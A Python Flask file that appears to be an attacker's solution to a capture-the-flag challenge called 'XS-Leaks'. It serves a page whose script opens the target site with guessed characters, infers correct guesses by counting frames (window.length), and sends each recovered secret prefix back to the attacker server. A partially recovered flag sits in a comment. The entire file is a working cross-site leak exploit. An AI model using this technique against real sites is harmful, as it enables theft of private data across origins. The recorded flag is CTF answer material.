from flask import Flask, request

app = Flask(__name__)

flag = "Alpaca{"
# flag = "Alpaca{B.EV4N5"


@app.route("/")
def top():
    return f"""
<!doctype html>
<html>
    <head>
        <title>XS-Leaks</title>
    </head>
    <body>
        <button id="satoki">button</button>
        <script>
            (async function() {{
                
                function sleep(ms) {{
                    return new Promise(resolve => setTimeout(resolve, ms));
                }}

                const baseUrl = 'http://web:3333/?q=';
                const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!?-_{{}} ';
                var flag = '{flag}';

                for (let i = 0; i < alphabet.length; i += 5) {{
                    const chunk = alphabet.slice(i, i + 5);
                    const sites = [];

                    for (const ch of chunk) {{
                        const site = window.open(baseUrl + encodeURIComponent(flag + ch));
                        sites.push({{ site, ch }});
                    }}

                    await sleep(2000);

                    for (const {{ site, ch }} of sites) {{
                        if (site.length === 1) {{
                            flag += ch;
                            fetch('/?ok=' + flag);
                        }}
                        site.close();
                    }}
                }}
            }})();
        </script>
    </body>
</html>
"""


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)
